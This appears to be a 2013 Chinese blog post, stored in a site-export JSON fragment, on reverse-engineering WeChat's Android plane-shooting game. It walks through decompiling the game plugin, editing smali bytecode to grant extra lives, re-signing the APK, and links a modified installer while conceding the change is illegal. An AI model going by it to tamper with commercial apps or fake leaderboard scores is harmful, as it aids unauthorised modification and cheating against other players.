{<br>setState(GameSprite.State.HITING);<br><br>}<br>}<br>[/java]<br><br></div><br><div></div><br><div>java 代码我们知道怎么修改了，那么smali里面的代码同样根据这个逻辑处理下即可，当然这块稍微有点难度，得看下语法手册再来修改，</div><br><div></div><br><div>修改的代码如下所示：</div><br><div>[java]&lt;/div&gt;<br>&lt;div&gt;<br>&lt;pre&gt;.method public hit(Z)V<br> .locals 2<br> .parameter<br><br>.prologue<br> .line 45<br> iget v0, p0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;liftCount:I<br><br>add-int/lit8 v0, v0, -0x1<br><br>iput v0, p0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;liftCount:I<br><br>.line 46<br> iget v0, p0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;liftCount:I<br><br>if-gtz v0, :cond_4<br><br>.line 47<br> if-eqz p1, :cond_0<br><br>.line 48<br> sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;DEAD:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;<br><br>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V<br><br>.line 57<br> :goto_0<br> iget-object v0, p0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;speedZero:Lcom/badlogic/gdx/math/ag;<br><br>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setSpeedVelocity(Lcom/badlogic/gdx/math/ag;)V<br><br>.line 61<br> :goto_1<br> return-void<br><br>.line 50<br> :cond_0<br> invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>move-result-object v0<br><br>sget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;ENEMY_AIRCAFT:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>if-eq v0, v1, :cond_1<br><br>invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>move-result-object v0<br><br>sget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;ENEMY_LARGE_AIRCAFT:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>if-eq v0, v1, :cond_1<br><br>invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>move-result-object v0<br><br>sget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;ENEMY_MIDDLE:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>if-eq v0, v1, :cond_1<br><br>invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>move-result-object v0<br><br>sget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;PROPS_BOMB:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>if-eq v0, v1, :cond_1<br><br>invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>move-result-object v0<br><br>sget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;PROPS_DOUBLE:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>if-ne v0, v1, :cond_3<br><br>.line 51<br> :cond_1<br> invoke-static {}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;Ml()Lcom/tencent/mm/plugin/shoot/a/h;<br><br>move-result-object v0<br><br>invoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;MD()Lcom/tencent/mm/plugin/shoot/a/l;<br><br>move-result-object v0<br><br>invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>move-result-object v1<br><br>invoke-virtual {v0, v1}, Lcom/tencent/mm/plugin/shoot/a/l;-&gt;c(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;)V<br><br>.line 55<br> :cond_2<br> :goto_2<br> sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;EXPLODING:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;<br><br>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V<br><br>goto :goto_0<br><br>.line 52<br> :cond_3<br> invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>move-result-object v0<br><br>sget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;HERO:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>if-ne v0, v1, :cond_2<br><br>.line 53<br> invoke-static {}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;Ml()Lcom/tencent/mm/plugin/shoot/a/h;<br><br>move-result-object v0<br><br>invoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;MD()Lcom/tencent/mm/plugin/shoot/a/l;<br><br>move-result-object v0<br><br>invoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/l;-&gt;MT()V<br><br>goto :goto_2<br><br>###注意这里是我家的代码<br><br>invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>move-result-object v0<br><br>sget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;HERO:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;<br><br>if-ne v0, v1, :cond_11<br><br>###本段结束<br><br>.line 59<br> :cond_4<br> sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;HITING:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;<br><br>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V<br><br>###注意这里是我家的代码<br> :cond_11<br> sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;FLIGTHING:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;<br><br>invoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V<br><br>###本段结束<br><br>goto :goto_1<br>.end method<br>[/java]<br><br>同理，需要给自己飞机多增加一些炸弹或者双子弹等都可以在palyer初始化的时候调用相应的方法，根据添加的方法写出对应的smali代码就能实现上面分析的无敌模式的多种情况 接下来我们需要进行打包，修改完代码后，用如下命令打包<br><br>[shell]<br>&lt;pre&gt;apk b 解包的包文件夹名称<br>[/shell]<br><br>这里需要注意的是，打包后必须进行签名，不然只对微信的apk包做签名处理是不起作用的。 签名命令如下：<br><br>[shell]<br>&lt;pre&gt;# 注意 update.zip 是需要签名的文件 update_signed.zip 是签名后的文件<br>java -jar signapk.jar testkey.x509.pem testkey.pk8 update.zip update_signed.zip<br>[/shell]<br><br>签名后把微信的apk安装包重命名为zip结尾，然后用压缩工具打开，替换里面相应的com.tencent.mm.plugin.shoot.XXXXXX<br>替换后对微信安装包重新签名即可，注意用adb安装程序的话不管什么结尾的文件名都行，要是copy到内存卡中进行安装必须改成apk不然识别不了。<br>这里提供一个改好的apk安装包，下载地址：<a href=\"http://pan.baidu.com/share/link?shareid=1113420314&amp;uk=2317334154\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/share/link?shareid=1113420314&amp;uk=2317334154</a><br>注意：修改别人的软件是不合法的，所以这里提供的修改版本安装包我可没说是自己改的或许是从网上找的，大家懂得就行。<br><br></div><br></div>\n","source":"_posts/android版微信打飞机无敌补丁分析及其制作方法.md","raw":"title: \"android版微信打飞机无敌补丁分析及其制作方法\"\nid: 303\ndate: 2013-08-13 15:05:43\ntags: \n- android\n- java\n- 打飞机\ncategories: \n- 原创作品\n- 技术文章\n---\n\n最近微信5.0版本发布后增加了游戏中心，并且自带一款打飞机游戏,ios版本刚发布1天就被crack掉,并且除了一个无敌补丁，奈何手里没ios设备也没法测试.自己玩了下，感觉游戏真没多少技术含量，不过微信的优势很明显，集成了好友数据,所以结果就是最近天天听到那些家伙喊着”打飞机” ~。~\n\n不过对于游戏一点都不感冒的我看到好友那么高的分数再对比下自己，额真有点那个啥。所以对于技术控来说去拼命玩那个玩意就有点浪费生命了，所以本着hack for fun 的思想就试试看看能crack掉不.\n\n首先分析下游戏\n\n游戏对象：\n\n飞机，子弹，炸弹，敌机\n实现方法就有多种成为无敌的方法:\n\n1.让飞机无敌，也就是不死\n\n2.让子弹威力变大，并且不消失,这样一个子弹就可以打多个敌机\n\n3.给自己添加”大量”炸弹,这样也就无敌了\n\n4.让敌机碰到自己无效,这样就相当于隐形模式了,同样无敌了\n\n5.给自己多加几条名，这样既可以达到无敌的方式又可以死掉（方便提交分数）不然死都死不掉。\n\n<!--more-->\n\n代码分析:\n\n刚开始看到这个游戏以为用的是html5+js写的,不过解包后看到里面的东西就傻眼了，不过依然有方法.\n\n1.下载 5.0 android的版本的微信,修改后缀名为zip然后解压,如图:\n\n[![201381901926167](http://asset.creturn.com/asset/uploads/2013/11/201381901926167.png)](http://asset.creturn.com/asset/uploads/2013/11/201381901926167.png)\n\n2.在解压的目录中找到assset目录然后打开里面的preload目录，如图:\n\n[![201381901927891](http://asset.creturn.com/asset/uploads/2013/11/201381901927891.png)](http://asset.creturn.com/asset/uploads/2013/11/201381901927891.png)\n\n可以看到这个目录放了一些jar包，猜测微信采用插件机制来实现功能模块的扩展,其中以”com.tencent.mm.plugin.shoot”开头的jar包，从名字中可以猜测到它就是我们的目标\n\n这里要说后面需要用到的两款软件:\n\n1.apktool :用来把apk或者jar包反编译成android的java虚拟机的机器码,方便修改代码逻辑\n\n下载地址: https://code.google.com/p/android-apktool/\n\n2.dex2jar :用来把dex文件反编译jar\n\n下载地址: http://pan.baidu.com/share/link?shareid=2401317361&amp;uk=2317334154\n\n3.auto-sign: 用来对apk进行签名的\n\n下载地址: http://pan.baidu.com/share/link?shareid=2387101337&amp;uk=2317334154\n\n4.jd-gui: 用来查看编译过的class java代码\n\n下载地址: http://java.decompiler.free.fr/?q=jdgui\n\n工具齐全后就开始对代码动刀\n\n用dex2jar把com.tencent.mm.plugin.shoot开头的那个文件处理下,会得到以dex2jar.jar结尾的文件用jd-gui打开这个文件，我们就能看到编译出来的文件，不过腾讯的同学对代码进行了混淆处理所以里面有很多a,b,c,d,e这样的文件,不过很不幸的是腾讯的家伙估计太粗心了，把游戏对象和功能代码没做混淆，混淆的反而是gdx游戏框架的代码,如图:\n\n[![201381901929371](http://asset.creturn.com/asset/uploads/2013/11/201381901929371.png)](http://asset.creturn.com/asset/uploads/2013/11/201381901929371.png)\n\n在actor这个包里面明显能看出来各个类的作用，不知道腾讯的同学是妹子想多了还是不给发奖金了，核心部分不做混淆处理…\n\n上面分析的时候说过无敌模式的几种方式，我这里采用最后一种给自己多加几条命这样也能死掉~~  不然分数都提交不了就没有意义了，看看Player类中的构造函数（或者叫做初始化函数也行）：\n\n[java]\n&lt;pre&gt;public Player()\n {\n setLiftCount(1);\n setType(GameSprite.Type.HERO);\n setState(GameSprite.State.FLIGTHING);\n setSpeedVelocity(new ag(0.0F, 0.0F));\n getBounds().height = HEIGHT;\n getBounds().width = WIDTH;\n this.mShootDelay = (4.0F * h.Ml().MC().Mi().cEP);\n this.mShootDoubleTime = h.Ml().MC().Mi().cEQ;\n }&lt;/pre&gt;\n[/java]\n\n明显能够看出来setLiftCount() 这个方法是用来初始化生命值的，如果把这里改大点，不就实现了我们的多条命了。\n\n用apktool工具对 com.tencent.mm.plugin.shoot开头的这个包进行反编译，命令如下：\n\n[shell]\n&lt;pre&gt;apktool d 文件名&lt;/pre&gt;\n[/shell]\n\n后面的d参数是反编译，如果换成b就是再次编译回去。\n\n解包后文件如下图所示：\n\n[![201381901932654](http://asset.creturn.com/asset/uploads/2013/11/201381901932654.png)](http://asset.creturn.com/asset/uploads/2013/11/201381901932654.png)\n\n其中smali目录就是反编译后的代码，里面的文件以 smali结尾，文件位置和包位置保持一致如下图：\n\n[![201381901933428](http://asset.creturn.com/asset/uploads/2013/11/201381901933428.png)](http://asset.creturn.com/asset/uploads/2013/11/201381901933428.png)\n\n用任意一款文本编辑器打开Player.smali文件，我们可以看到里面的代码，如下图：\n\n[![201381901935312](http://asset.creturn.com/asset/uploads/2013/11/201381901935312.png)](http://asset.creturn.com/asset/uploads/2013/11/201381901935312.png)\n\n仔细看有点像汇编，不过它却不是网上可以找到smali语法帮助，我们在这个文件中找到初始化方法，constructor &lt;init&gt;()看着是不是很眼熟：\n\n[java]\n&lt;pre&gt;.method public constructor &lt;init&gt;()V\n .locals 2\n\n.prologue\n const/4 v1, 0x0\n\n.line 46\n invoke-direct {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;&lt;init&gt;()V\n\n.line 32\n sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/Player$BulletType;-&gt;NORMAL:Lcom/tencent/mm/plugin/shoot/actor/Player$BulletType;\n\niput-object v0, p0, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;mBulleType:Lcom/tencent/mm/plugin/shoot/actor/Player$BulletType;\n\n.line 47\n const/4 v0, 0x1\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setLiftCount(I)V\n\n.line 48\n sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;HERO:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setType(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;)V\n\n.line 49\n sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;FLIGTHING:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V\n\n.line 50\n new-instance v0, Lcom/badlogic/gdx/math/ag;\n\ninvoke-direct {v0, v1, v1}, Lcom/badlogic/gdx/math/ag;-&gt;&lt;init&gt;(FF)V\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setSpeedVelocity(Lcom/badlogic/gdx/math/ag;)V\n\n.line 52\n invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;getBounds()Lcom/badlogic/gdx/math/af;\n\nmove-result-object v0\n\nsget v1, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;HEIGHT:F\n\niput v1, v0, Lcom/badlogic/gdx/math/af;-&gt;height:F\n\n.line 53\n invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;getBounds()Lcom/badlogic/gdx/math/af;\n\nmove-result-object v0\n\nsget v1, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;WIDTH:F\n\niput v1, v0, Lcom/badlogic/gdx/math/af;-&gt;width:F\n\n.line 55\n invoke-static {}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;Ml()Lcom/tencent/mm/plugin/shoot/a/h;\n\nmove-result-object v0\n\ninvoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;MC()Lcom/tencent/mm/plugin/shoot/a/d;\n\nmove-result-object v0\n\ninvoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/d;-&gt;Mi()Lcom/tencent/mm/plugin/shoot/a/b;\n\nmove-result-object v0\n\niget v0, v0, Lcom/tencent/mm/plugin/shoot/a/b;-&gt;cEP:F\n\nconst/high16 v1, 0x4080\n\nmul-float/2addr v0, v1\n\niput v0, p0, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;mShootDelay:F\n\n.line 59\n invoke-static {}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;Ml()Lcom/tencent/mm/plugin/shoot/a/h;\n\nmove-result-object v0\n\ninvoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;MC()Lcom/tencent/mm/plugin/shoot/a/d;\n\nmove-result-object v0\n\ninvoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/d;-&gt;Mi()Lcom/tencent/mm/plugin/shoot/a/b;\n\nmove-result-object v0\n\niget v0, v0, Lcom/tencent/mm/plugin/shoot/a/b;-&gt;cEQ:I\n\nint-to-long v0, v0\n\niput-wide v0, p0, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;mShootDoubleTime:J\n\n.line 60\n return-void\n.end method&lt;/pre&gt;\n[/java]\n\n根据smali语法修改如下代码：\n\n[java]\n&lt;pre&gt;.line 47\nconst/4 v0, 0x1\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setLiftCount(I)V\n[/java]\n\n改为:\n\n[java]\n&lt;pre&gt;.line 47\nconst/4 v0, 0x7  # 注意这里修改成7\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/Player;-&gt;setLiftCount(I)V&lt;/pre&gt;\n[/java]\n\n修改的地方把默认的1改成了7，也就是说有7条命了。不过别高兴太早，如果这样改了，是没有效果的。因为程序中判断飞机不在战斗状态时候\n<div></div>\n<div>是不显示的，所以还需要修改一处代码，先看看原来的java代码GameSprite.smali：</div>\n<div> [java]&lt;/div&gt;\n&lt;div&gt;\n&lt;pre&gt;public void hit(boolean paramBoolean)\n {\nthis.liftCount = (-1 + this.liftCount);\nif (this.liftCount &lt;= 0)\n{\nif (paramBoolean)\n{\nsetState(GameSprite.State.DEAD);\nsetSpeedVelocity(this.speedZero);\nreturn;\n}\nif ((getType() == GameSprite.Type.ENEMY_AIRCAFT) || (getType() == GameSprite.Type.ENEMY_LARGE_AIRCAFT) || (getType() == GameSprite.Type.ENEMY_MIDDLE) || (getType() == GameSprite.Type.PROPS_BOMB) || (getType() == GameSprite.Type.PROPS_DOUBLE))\nh.Ml().MD().c(getType());\nwhile (true)\n{\nsetState(GameSprite.State.EXPLODING);\nbreak;\nif (getType() == GameSprite.Type.HERO)\nh.Ml().MD().MT();\n}\n}\nsetState(GameSprite.State.HITING);\n }\n[/java]\n\n这段代码是所有游戏对象基类里面的碰撞处理代码，当生命值小于1 就移除该对象，如果生命值大于1则更改属性为HITING ,不过飞机如果遇到这\n<div></div>\n<div>个状态肯定不行的，撞机了还能继续飞？所以这里需要判断下如果是飞机，那么就要修改它的状态为：FLIGTHING</div>\n<div></div>\n<div>所以如果按照java代码修改的代码会和下面的代码一样：</div>\n<div>[java]&lt;/div&gt;\n&lt;div&gt;\n&lt;div&gt;\n&lt;pre&gt;public void hit(boolean paramBoolean)\n{\nthis.liftCount = (-1 + this.liftCount);\nif (this.liftCount &lt;= 0)\n{\nif (paramBoolean)\n{\nsetState(GameSprite.State.DEAD);\nsetSpeedVelocity(this.speedZero);\nreturn;\n}\nif ((getType() == GameSprite.Type.ENEMY_AIRCAFT) || (getType() == GameSprite.Type.ENEMY_LARGE_AIRCAFT) || (getType() == GameSprite.Type.ENEMY_MIDDLE) || (getType() == GameSprite.Type.PROPS_BOMB) || (getType() == GameSprite.Type.PROPS_DOUBLE))\nh.Ml().MD().c(getType());\nwhile (true)\n{\nsetState(GameSprite.State.EXPLODING);\nbreak;\nif (getType() == GameSprite.Type.HERO)\nh.Ml().MD().MT();\n}\n}\n\n//在这里添加我们的代码\n\nif(getType==GameSprite.Type.HERO)\n\n{\n\nsetState(GameSprite.State.FLIGTHING);\n\n} else {\nsetState(GameSprite.State.HITING);\n\n}\n}\n[/java]\n\n</div>\n<div></div>\n<div>java 代码我们知道怎么修改了，那么smali里面的代码同样根据这个逻辑处理下即可，当然这块稍微有点难度，得看下语法手册再来修改，</div>\n<div></div>\n<div>修改的代码如下所示：</div>\n<div>[java]&lt;/div&gt;\n&lt;div&gt;\n&lt;pre&gt;.method public hit(Z)V\n .locals 2\n .parameter\n\n.prologue\n .line 45\n iget v0, p0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;liftCount:I\n\nadd-int/lit8 v0, v0, -0x1\n\niput v0, p0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;liftCount:I\n\n.line 46\n iget v0, p0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;liftCount:I\n\nif-gtz v0, :cond_4\n\n.line 47\n if-eqz p1, :cond_0\n\n.line 48\n sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;DEAD:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V\n\n.line 57\n :goto_0\n iget-object v0, p0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;speedZero:Lcom/badlogic/gdx/math/ag;\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setSpeedVelocity(Lcom/badlogic/gdx/math/ag;)V\n\n.line 61\n :goto_1\n return-void\n\n.line 50\n :cond_0\n invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nmove-result-object v0\n\nsget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;ENEMY_AIRCAFT:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nif-eq v0, v1, :cond_1\n\ninvoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nmove-result-object v0\n\nsget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;ENEMY_LARGE_AIRCAFT:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nif-eq v0, v1, :cond_1\n\ninvoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nmove-result-object v0\n\nsget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;ENEMY_MIDDLE:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nif-eq v0, v1, :cond_1\n\ninvoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nmove-result-object v0\n\nsget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;PROPS_BOMB:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nif-eq v0, v1, :cond_1\n\ninvoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nmove-result-object v0\n\nsget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;PROPS_DOUBLE:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nif-ne v0, v1, :cond_3\n\n.line 51\n :cond_1\n invoke-static {}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;Ml()Lcom/tencent/mm/plugin/shoot/a/h;\n\nmove-result-object v0\n\ninvoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;MD()Lcom/tencent/mm/plugin/shoot/a/l;\n\nmove-result-object v0\n\ninvoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nmove-result-object v1\n\ninvoke-virtual {v0, v1}, Lcom/tencent/mm/plugin/shoot/a/l;-&gt;c(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;)V\n\n.line 55\n :cond_2\n :goto_2\n sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;EXPLODING:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V\n\ngoto :goto_0\n\n.line 52\n :cond_3\n invoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nmove-result-object v0\n\nsget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;HERO:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nif-ne v0, v1, :cond_2\n\n.line 53\n invoke-static {}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;Ml()Lcom/tencent/mm/plugin/shoot/a/h;\n\nmove-result-object v0\n\ninvoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/h;-&gt;MD()Lcom/tencent/mm/plugin/shoot/a/l;\n\nmove-result-object v0\n\ninvoke-virtual {v0}, Lcom/tencent/mm/plugin/shoot/a/l;-&gt;MT()V\n\ngoto :goto_2\n\n###注意这里是我家的代码\n\ninvoke-virtual {p0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;getType()Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nmove-result-object v0\n\nsget-object v1, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;-&gt;HERO:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$Type;\n\nif-ne v0, v1, :cond_11\n\n###本段结束\n\n.line 59\n :cond_4\n sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;HITING:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V\n\n###注意这里是我家的代码\n :cond_11\n sget-object v0, Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;-&gt;FLIGTHING:Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;\n\ninvoke-virtual {p0, v0}, Lcom/tencent/mm/plugin/shoot/actor/GameSprite;-&gt;setState(Lcom/tencent/mm/plugin/shoot/actor/GameSprite$State;)V\n\n###本段结束\n\ngoto :goto_1\n.end method\n[/java]\n\n同理，需要给自己飞机多增加一些炸弹或者双子弹等都可以在palyer初始化的时候调用相应的方法，根据添加的方法写出对应的smali代码就能实现上面分析的无敌模式的多种情况 接下来我们需要进行打包，修改完代码后，用如下命令打包\n\n[shell]\n&lt;pre&gt;apk b 解包的包文件夹名称\n[/shell]\n\n这里需要注意的是，打包后必须进行签名，不然只对微信的apk包做签名处理是不起作用的。 签名命令如下：\n\n[shell]\n&lt;pre&gt;# 注意 update.zip 是需要签名的文件 update_signed.zip 是签名后的文件\njava -jar signapk.jar testkey.x509.pem testkey.pk8 update.zip update_signed.zip\n[/shell]\n\n签名后把微信的apk安装包重命名为zip结尾，然后用压缩工具打开，替换里面相应的com.tencent.mm.plugin.shoot.XXXXXX\n替换后对微信安装包重新签名即可，注意用adb安装程序的话不管什么结尾的文件名都行，要是copy到内存卡中进行安装必须改成apk不然识别不了。\n这里提供一个改好的apk安装包，下载地址：[http://pan.baidu.com/share/link?shareid=1113420314&amp;uk=2317334154](http://pan.baidu.com/share/link?shareid=1113420314&amp;uk=2317334154)\n注意：修改别人的软件是不合法的，所以这里提供的修改版本安装包我可没说是自己改的或许是从网上找的，大家懂得就行。\n\n</div>\n</div>\n","slug":"android版微信打飞机无敌补丁分析及其制作方法","updated":1421659126000,"excerpt":"<p>最近微信5.0版本发布后增加了游戏中心，并且自带一款打飞机游戏,ios版本刚发布1天就被crack掉,并且除了一个无敌补丁，奈何手里没ios设备也没法测试.自己玩了下，感觉游戏真没多少技术含量，不过微信的优势很明显，集成了好友数据,所以结果就是最近天天听到那些家伙喊着”打飞机” ~。~</p>\n<p>不过对于游戏一点都不感冒的我看到好友那么高的分数再对比下自己，额真有点那个啥。所以对于技术控来说去拼命玩那个玩意就有点浪费生命了，所以本着hack for fun 